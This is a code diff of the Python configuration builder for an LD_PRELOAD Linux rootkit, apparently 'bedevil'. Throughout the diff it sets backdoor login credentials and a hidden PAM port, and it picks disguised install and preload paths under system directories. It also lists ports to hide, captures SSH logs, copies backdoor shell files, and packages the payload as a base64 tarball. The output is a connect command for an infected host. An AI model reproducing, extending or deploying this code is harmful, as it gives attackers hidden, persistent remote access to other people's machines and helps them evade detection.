@@ -5,14 +5,11 @@
 
 # if you would like any of these credentials to have random values just set them to 'None'.
 # they get shown to you beforehand anyway.
-BD_UNAME = 'changeme'
-BD_PWD   = 'changeme'
-PAM_PORT = 13337
+BD_UNAME = 'super'
+BD_PWD   = 'hacker'
+PAM_PORT = 7971
 
 # END OF SETTINGS
-
-
-
 
 
 
@@ -21,81 +18,43 @@ from shutil import copytree, copy
 from base64 import b64encode
 from string import ascii_uppercase, ascii_lowercase, digits
 from random import choice
-from os import listdir, system
+from os import listdir, system, unlink
 from os.path import join, basename
 
-USED_PATHS = [] # 'random' paths we've already got.
 
-def randgarb(garbset, garblen):
-    garb = ''.join(choice(garbset) for _ in range(garblen))
-    return garb
 
-def randpath(maxlen):
-    rootdirs = ['/usr', '/etc', '/lib']
-    randroot = choice(rootdirs)
-    randdir = choice(listdir(randroot))
-
-    while len(randdir) < maxlen:
-        randdir += randgarb(ascii_lowercase, 1)
-
-    while len(randdir) > maxlen:
-        randdir = randdir[:-1]
-
-    suffix = randgarb(ascii_lowercase, 3)
-    newpath = '{0}/{1}{2}'.format(randroot, randdir, suffix)
-    if newpath in USED_PATHS or '.' in newpath:
-        newpath = randpath(maxlen)
-    USED_PATHS.append(newpath)
-    return newpath
-
-PRELOAD_FILE = randpath(10)
-
-if BD_UNAME == None:
-    BD_UNAME = randgarb(ascii_lowercase, 7)
-if BD_PWD == None:
-    BD_PWD = randgarb(ascii_lowercase+ascii_uppercase+digits, 9)
-if PAM_PORT == None:
-    PAM_PORT = choice(range(11111, 63556))
-
-print('Username: ' + BD_UNAME)
-print('Password: ' + BD_PWD)
-print('Hidden port: ' + str(PAM_PORT))
-
-BD_PWD = crypt(BD_PWD, "$6$"+randgarb(ascii_lowercase+ascii_uppercase+digits, 16))
-
-MAGIC_GID = randgarb(digits.replace('0',''), 6)
-GID_PATH = randpath(5)
-GIDTIME_PATH = randpath(5)
-BD_VAR = randgarb(ascii_uppercase, 9)
-#print('Magic GID: ' + str(MAGIC_GID))
-#print('Magic environment variable: ' + BD_VAR)
-
-INSTALL_DIR = randpath(7)
-BDVLSO = 'lib' + basename(INSTALL_DIR) + '.so'
-SOPATH = '{0}/{1}.$PLATFORM'.format(INSTALL_DIR, BDVLSO)
-print('Install directory: ' + INSTALL_DIR)
-#print('bdvl SO: ' + BDVLSO)
-#print('SO path: ' + SOPATH)
-
-HIDEPORTS = randpath(7)
-SSH_LOGS = randpath(7)
-INTEREST_DIR = randpath(7)
-SSHD_CONFIG = randpath(7)
-
-INC = 'inc'
-NEW_INC = 'new_inc'
-
-BDVLH = NEW_INC + '/bedevil.h'
-
-DEFAULTS = [BD_UNAME, BD_PWD, int(MAGIC_GID), BD_VAR, INSTALL_DIR,
-            BDVLSO, SOPATH, PRELOAD_FILE, SSH_LOGS, INTEREST_DIR,
-            HIDEPORTS, GID_PATH, GIDTIME_PATH, int(PAM_PORT), SSHD_CONFIG]
-DEF_NAMES = ['BD_UNAME', 'BD_PWD', 'MAGIC_GID', 'BD_VAR', 'INSTALL_DIR',
-             'BDVLSO', 'SOPATH', 'PRELOAD_FILE', 'SSH_LOGS', 'INTEREST_DIR',
-             'HIDEPORTS', 'GID_PATH', 'GIDTIME_PATH', 'PAM_PORT', 'SSHD_CONFIG']
-
+# 'random' paths we've already got.
+USED_PATHS = []
 # stores all names of hooked funcs
 ALL_HOOKS = []
+
+class Util():
+    def randgarb(self, garbset, garblen):
+        garb = ''.join(choice(garbset) for _ in range(garblen))
+        return garb
+
+    def cryptpw(self, plain):
+        salt = self.randgarb(ascii_uppercase+ascii_lowercase+digits, 16)
+        hashd = crypt(plain, "$6$"+salt)
+        return hashd
+
+    def randpath(self, maxlen):
+        rootdirs = ['/usr', '/etc', '/lib']
+        randroot = choice(rootdirs)
+        randdir = choice(listdir(randroot))
+
+        while len(randdir) < maxlen:
+            randdir += self.randgarb(ascii_lowercase, 1)
+
+        while len(randdir) > maxlen:
+            randdir = randdir[:-1]
+
+        suffix = self.randgarb(ascii_lowercase, 3)
+        newpath = '{0}/{1}{2}'.format(randroot, randdir, suffix)
+        if newpath in USED_PATHS or '.' in newpath:
+            newpath = self.randpath(maxlen)
+        USED_PATHS.append(newpath)
+        return newpath
 
 
 class Definitions():
@@ -166,7 +125,7 @@ class CArray():
 
     # build elements of target array.
     def buildelems(self, elems='{'):
-        for elem in self.array_list:  # each element is already xor'd.
+        for elem in self.array_list:
             elems += '"{0}",'.format(elem)
         elems = elems[:-1]  # remove trailing comma.
         elems += '};\n'
@@ -180,9 +139,66 @@ class CArray():
         return result
 
 
+# bunch of settings related stuff...
+ut = Util()
 
-def write_hooks():
-    #print('Writing hooked function names')
+if BD_UNAME == None:
+    BD_UNAME = ut.randgarb(ascii_lowercase, 7)
+if BD_PWD == None:
+    BD_PWD = ut.randgarb(ascii_lowercase+ascii_uppercase+digits, 9)
+if PAM_PORT == None:
+    PAM_PORT = choice(range(11111, 63556))
+
+print('Username: ' + BD_UNAME)
+print('Password: ' + BD_PWD)
+print('Hidden port: ' + str(PAM_PORT))
+
+_BD_PWD = BD_PWD # just to show it at the end
+BD_PWD = ut.cryptpw(BD_PWD)
+
+MAGIC_GID = ut.randgarb(digits.replace('0',''), 6)
+GID_PATH = ut.randpath(5)
+GIDTIME_PATH = ut.randpath(5)
+BD_VAR = ut.randgarb(ascii_uppercase, 9)
+#print('Magic GID: ' + str(MAGIC_GID))
+#print('Magic environment variable: ' + BD_VAR)
+
+INSTALL_DIR = ut.randpath(7)
+BDVLSO = 'lib' + basename(INSTALL_DIR) + '.so'
+SOPATH = '{0}/{1}.$PLATFORM'.format(INSTALL_DIR, BDVLSO)
+PRELOAD_FILE = ut.randpath(10)
+#print('Install directory: ' + INSTALL_DIR)
+#print('bdvl SO: ' + BDVLSO)
+#print('SO path: ' + SOPATH)
+
+HIDEPORTS = ut.randpath(7)
+SSH_LOGS = ut.randpath(7)
+INTEREST_DIR = ut.randpath(7)
+SSHD_CONFIG = ut.randpath(7)
+
+INC = 'inc'
+NEW_INC = 'new_inc'
+
+BDVLH = NEW_INC + '/bedevil.h'
+
+SETTINGS = {
+    'BD_UNAME':BD_UNAME,         'BD_PWD':BD_PWD,
+    'MAGIC_GID':int(MAGIC_GID),  'BD_VAR':BD_VAR,
+    'INSTALL_DIR':INSTALL_DIR,   'BDVLSO':BDVLSO,
+    'SOPATH':SOPATH,             'PRELOAD_FILE':PRELOAD_FILE,
+    'SSH_LOGS':SSH_LOGS,         'INTEREST_DIR':INTEREST_DIR,
+    'HIDEPORTS':HIDEPORTS,       'GID_PATH':GID_PATH,
+    'GIDTIME_PATH':GIDTIME_PATH, 'PAM_PORT':int(PAM_PORT),
+    'SSHD_CONFIG':SSHD_CONFIG,
+}
+
+
+
+# read the list of hooked function names from libdl directory &
+# create C arrays for them where the contents are referenced by
+# the hook() & call() macro wrappers & their functions defined
+# in libdl.h.
+def gethooks():
     hookspath = NEW_INC + '/hooks/libdl/hooks'
 
     fd = open(hookspath, 'r')
@@ -191,115 +207,103 @@ def write_hooks():
 
     allhooks = ''
     for line in contents:
+        # empty lines or comment lines are of no interest to us.
         if len(line) == 0 or line[0] == '#':
             continue
 
+        # libname:hook1,hook2,hook3,hook4...
         curtoks = line.split(':')
         
         targetlib = curtoks[0]
         targetsyms = curtoks[1]
+
+        # divide all hooked function names into one list.
         hooktoks = targetsyms.split(',')
 
+        # add all of the hooked function names from the current target library into a list for all.
         for curhook in hooktoks:
             ALL_HOOKS.append(curhook)
 
-        newarr = CArray(targetlib, targetlib.upper()+'_SIZE', hooktoks)
+        # create the C array for the current target lib & the hooked functions
+        cursizedef = targetlib.upper() + '_SIZE'
+        newarr = CArray(targetlib, cursizedef, hooktoks)
         allhooks += newarr.create()
 
-    fd = open(BDVLH, 'a')
-    fd.write(allhooks)
-    fd.close()
-    #print('Finished writing hooks')
+    return allhooks
 
 
-def findallheaders():
-    includeh = NEW_INC + '/includes.h'
-    fd = open(includeh, 'r')
-    contents = fd.read().split('\n')
-    fd.close()
+def setupcfg():
+    targets = ['MAGIC_GID', 'INSTALL_DIR', 'PRELOAD_FILE', 'BDVLSO',
+               'SOPATH', 'HIDEPORTS', 'SSH_LOGS', 'INTEREST_DIR',
+               'BD_VAR', 'GID_PATH', 'GIDTIME_PATH']
 
-    gotheaders = []
-    for line in contents:
-        if not '#include' in line[:8]:
-            continue
-
-        line = line.split('"')[1]
-        actualpath = NEW_INC + '/' + line
-
-        fd = open(actualpath, 'r')
-        if not '??' in fd.read():
-            fd.close()
-            continue
-        fd.close()
-
-        gotheaders.append(actualpath)
-        #print(actualpath)
-    return gotheaders
-
-
-
-def writebdvlh(buf):
-    fd = open(BDVLH, 'a')
-    fd.write(buf)
+    fd = open(NEW_INC+'/settings.cfg', 'a')
+    for target in targets:
+        try:
+            fd.write(SETTINGS[target]+'\n')
+        except:
+            fd.write(str(SETTINGS[target])+'\n')
     fd.close()
 
-def setup_config(): # every step chronologically
+
+def setup_config():
     copytree(INC, NEW_INC)
-    write_hooks()
 
-    gotbdvlh = ''
-    for placeholderi in range(len(DEFAULTS)):
-        target = DEF_NAMES[placeholderi]
-        value = DEFAULTS[placeholderi]
+    KEYS   = SETTINGS.keys()
+    VALUES = SETTINGS.values()
+    gotbdvlh = gethooks()
 
+    for settingi in range(len(SETTINGS)):
+        target = KEYS[settingi]
+        value = VALUES[settingi]
+
+        # if the target setting is a port, add it into the hideports file.
         targettok = target.split('_')
-        for tok in targettok:
-            if tok == 'PORT':
-                fd = open(NEW_INC+'/hideports', 'a+')
-                fd.write(str(value)+'\n')
-                fd.close()
+        if 'PORT' in targettok:
+            fd = open(NEW_INC+'/hideports', 'a')
+            fd.write(str(value)+'\n')
+            fd.close()                
 
         try:
             gotbdvlh += '#define {0} \"'.format(target) + value + '\"\n'
         except:
             gotbdvlh += '#define {0} {1}\n'.format(target, str(value))
+
     gotbdvlh += '#define ASS_PATH INSTALL_DIR\"/my_ass\"\n'
     defs = Definitions(ALL_HOOKS)
     gotbdvlh += defs.getidents()
 
-    allhooksarr = CArray('all', 'ALL_SIZE', ALL_HOOKS)
+    allhookssiz = 'ALL_SIZE'
+    allhooksarr = CArray('all', allhookssiz, ALL_HOOKS)
     gotbdvlh += allhooksarr.create()
-    gotbdvlh += 'syms symbols[ALL_SIZE];\n'
-    writebdvlh(gotbdvlh)
+    gotbdvlh += 'syms symbols[{0}];\n'.format(allhookssiz)
 
+    # bedevil.h complete. write it.
+    fd = open(BDVLH, 'w')
+    fd.write(gotbdvlh)
+    fd.close()
+
+    # cp backdoor shell files.
     copy('etc/.rolf', NEW_INC+'/.rolf')
     copy('etc/.bashrc', NEW_INC+'/.bashrc')
 
+    # write magic GID value so auto.sh can cat it into GID_PATH.
     fd = open(NEW_INC+'/magic_gid', 'w')
-    fd.write(str(MAGIC_GID))
+    fd.write(str(SETTINGS['MAGIC_GID']))
     fd.close()
 
-    settcfg = str(MAGIC_GID)+'\n'
-    settcfg += INSTALL_DIR+'\n'
-    settcfg += PRELOAD_FILE+'\n'
-    settcfg += BDVLSO+'\n'
-    settcfg += SOPATH+'\n'
-    settcfg += HIDEPORTS+'\n'
-    settcfg += SSH_LOGS+'\n'
-    settcfg += INTEREST_DIR+'\n'
-    settcfg += BD_VAR+'\n'
-    settcfg += GID_PATH+'\n'
-    settcfg += GIDTIME_PATH+'\n'
-    fd = open(NEW_INC+'/settings.cfg', 'w')
-    fd.write(settcfg)
-    fd.close()
+    # write all the settings auto.sh needs.
+    setupcfg()
 
-    system('tar cpfz {0}.tar.gz {0}'.format(NEW_INC))
-    fd = open(NEW_INC+'.tar.gz', 'r')
+    # mk tar.gz of include dir. b64 it. rm it.
+    system('tar cpfz {0}.tar.gz {1}'.format(BD_UNAME, NEW_INC))
+    fd = open(BD_UNAME+'.tar.gz', 'r')
     targzb64 = b64encode(fd.read())
     fd.close()
+    unlink(BD_UNAME+'.tar.gz')
     
-    fd = open(NEW_INC+'.b64', 'w')
+    # write b64.
+    fd = open(BD_UNAME+'.b64', 'w')
     fd.write(targzb64)
     fd.close()
 
@@ -308,4 +312,6 @@ def setup_config(): # every step chronologically
 
 if __name__ == '__main__':
     setup_config()
-    print('\tsh etc/ssh.sh {0} <host> {1}'.format(BD_UNAME, str(PAM_PORT)))
+    template = 'sh etc/ssh.sh {0} <host> {1} # {2}'.format(BD_UNAME, str(PAM_PORT), _BD_PWD)
+    print('\n\t\033[1;31m{0}\033[0m\n'.format(template))
+
